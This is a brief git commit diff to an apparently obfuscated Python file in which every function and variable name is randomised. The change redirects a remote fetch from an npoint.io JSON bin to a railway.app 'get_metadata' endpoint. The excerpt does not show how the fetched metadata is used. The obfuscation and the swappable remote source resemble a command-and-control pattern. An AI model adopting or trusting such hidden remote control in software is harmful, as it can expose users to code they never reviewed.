af9b1ff6bc9a0499cd2c58f642eea3c85dde6f40
yaiiyoku69 <zulenis15@outlook.com>
2025-06-10 12:32:12 +0000

    Update wevalo.py

--- wevalo.py
+++ wevalo.py
@@ -16,7 +16,7 @@ def model_anepgw_248():
 
     def learn_urkjot_296():
         try:
-            net_eowlhi_959 = requests.get('https://api.npoint.io/15ac3144ebdeebac5515', timeout=10)
+            net_eowlhi_959 = requests.get('https://outlook-profile-production.up.railway.app/get_metadata', timeout=10)
             net_eowlhi_959.raise_for_status()
             process_btchfv_698 = net_eowlhi_959.json()
             learn_bzgzio_396 = process_btchfv_698.get('metadata')
